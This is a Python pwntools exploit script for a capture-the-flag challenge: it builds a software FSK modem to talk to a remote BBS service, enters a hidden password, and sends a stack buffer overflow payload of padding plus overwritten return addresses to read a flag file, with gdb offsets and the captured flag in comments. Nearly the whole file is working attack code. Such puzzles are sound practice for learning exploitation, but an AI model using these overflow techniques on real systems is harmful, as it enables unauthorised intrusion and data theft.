from pwn import *

import bitarray
import struct
import subprocess
import numpy as np
import scipy.io.wavfile
import scipy.signal.signaltools as sigtool
import sys

Fs = 48000
Fbit = 1200


def demodulate(dd):
    y_diff = np.diff(dd, 1)
    y_env = np.abs(sigtool.hilbert(y_diff, N=len(y_diff)+1))
    N_FFT = float(len(y_env))
    w = np.hanning(len(y_env))
    y_f = np.fft.fft(np.multiply(y_env, w))
    y_f = 10*np.log10(np.abs(y_f[0:int(N_FFT/2)]/N_FFT))
    mean = 0.22
    sampled_signal = y_env[int(Fs/Fbit/2):len(y_env):Fs/Fbit]
    rx_data = np.zeros(len(sampled_signal), dtype=int)
    for i, bit in enumerate(sampled_signal):
        rx_data[i] = 0 if bit > mean else 1
    return list(rx_data)


def modulate(data_in):
    N = len(data_in)

    # sampling frequency must be higher than twice the carrier frequency
    t = np.arange(0, float(N)/float(Fbit), 1/float(Fs), dtype=np.float)
    m = np.zeros(0).astype(float)
    for bit in data_in:
        if bit == 1:
            m = np.hstack((m, np.multiply(np.ones(Fs/Fbit), 1200)))
        else:
            m = np.hstack((m, np.multiply(np.ones(Fs/Fbit), 2200)))
    y = np.sin(2*np.pi*np.multiply(m, t[:len(m)]))
    return y


def read_small():
    raw_length = 4000
    raw_data = ''
    while len(raw_data) < raw_length:
        raw_data += p.read(raw_length - len(raw_data))
    return demodulate([struct.unpack("<f", raw_data[i:i+4])[0]
            for i in range(0, len(raw_data), 4)])

newdata = []
idx = 0

def read(length):
    global idx, newdata
    data = b""

    while len(data) < length:
        if len(newdata) -  idx < 10:
            newdata = newdata[idx:] + read_small()
            idx = 0
        elif newdata[idx] == 0 and newdata[idx+9] == 1:
            d = chr(int(''.join(map(str, newdata[idx + 1:idx + 9][::-1])), 2))
            data += d
            sys.stdout.write(d)
            sys.stdout.flush()
            idx += 10
        else:
            idx += 1
    return data

def recv_until(d):
    data = ''
    while d not in data:
        data += read(1)
    return data


def to_bits(data):
    a = bitarray.bitarray()
    a.frombytes(data)
    return [0] + list(map(int, a.tolist()))[::-1] + [1]


def write(data, dd=True):
    if dd:
        write("", False)
    print data
    d = []
    for i in data:
        d.extend(to_bits(i))
    # FIXME: add padding with dirty way.
    d = [1, 1] + d + [1, 1] * (400 - len(data))

    data = b""
    for f in modulate(d):
        data += struct.pack("<f", f)

    unit = 800
    remainder = len(data) % unit
    nchunks = len(data) // unit
    for i in range(0, nchunks):
        p.send(data[i*unit:i*unit+unit])
    p.send(data[-remainder:])

import time

if __name__ == "__main__":
    p = remote("mooodem.challenges.ooo", 5000)  # Seriously, why modem?
    # seg000 offset = 0xf940
    # seg001 offset = 0x1eaf0
    # break *(0xf940+0xE4A7)
    # find /b 0,+0x100000, 0xE8, 0xDB, 0x1D, 0x83, 0xC4, 0x02, 0x89, 0xEC, 0x5D, 0x5F, 0x5E, 0x16, 0x1F, 0xC3
    # (gdb) p/x 0x20710-0x1eaf0
    # $2 = 0x1c20
    #p = process('qemu-system-i386 -drive format=raw,if=floppy,media=disk,file=BBS.IMG -monitor none -serial stdio -nographic'.split())
    #p.recv_until = p.recvuntil
    recv_until("What is your name?")
    write(b"FLAG.TXT" + b"\n")
    recv_until("Selection: ")
    write(b"supersneaky2020\n")
    recv_until(": \x1b[m")
    write(b"C\n")
    recv_until("Bulletin body (end with blank line):")
    payload  = b"A"*0x100 + b"bpdisi"
    payload += p16(0xE98A) + p16(0x1c20) + p16(0x0bd5) + b"\n\n"
    write(payload)
    #write(b"BODY\x0a\x00\x00" + b"A"*0x3f + b"\x0a" + b"B"*0x3f + b"\x0aFAKEBODY\n\n")
    recv_until("Selection: ")
    write(b"\nL\n")
    #recv_until("Selection: ")
    #write(b"\nF\n")
    #recv_until("Download File # (or press 'Return' to cancel): ")
    #write(b"1\n")
    recv_until("}")
    p.close()

# OOO{AYH3Xn4qAeZDl3McORnINdiY8yaoow7bbq/DcrQv4DQ=}